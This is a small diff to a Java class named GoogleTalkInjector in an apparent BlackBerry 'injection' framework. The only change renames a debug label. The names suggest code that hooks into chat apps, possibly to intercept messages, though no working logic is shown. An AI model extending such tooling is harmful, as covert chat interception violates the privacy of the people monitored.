@@ -7,7 +7,7 @@ import blackberry.injection.injectors.group.ChatGroupInjector;
 public class GoogleTalkInjector extends ChatGroupInjector {
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("GoogleTalkInjector",
+    private static Debug debug = new Debug("GTalkInjector",
             DebugLevel.VERBOSE);
 
     //#endif
